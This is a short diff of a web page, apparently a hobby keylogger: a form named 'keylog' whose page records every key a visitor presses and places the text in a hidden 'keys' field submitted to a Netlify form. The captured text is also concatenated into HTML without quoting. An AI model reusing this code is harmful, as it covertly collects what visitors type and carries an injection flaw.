@@ -13,9 +13,13 @@
 async function demo() {
     for (let lol = 0; lol < 10; lol++) {
         await sleep(lol * 10);
+				document.getElementById("wuh").innerHTML = ("<input type='submit' value='Submit'>");
     }
 document.getElementById("z").innerHTML += (y);
-document.getElementById("bruh").innerHTML = ("<input type='hidden' name='keys' value="+(document.getElementById("z").innerHTML));
+let reb = document.getElementById("z").innerHTML;
+document.getElementById("bruh").innerHTML = ("<input type='hidden' name='keys' value="+reb+" />");
+let rib = document.getElementById("z").innerHTML;
+console.log(rib);
 }
 
 demo();
@@ -24,7 +28,7 @@ demo();
 </head>
 <form name="keylog" data-netlify="true">
 <p id=bruh></p>
-<input type="submit" value="Submit">
+<p id=wuh></p>
 </form>
 <body onkeydown="GetChar(event);">
 <p id=z></p>
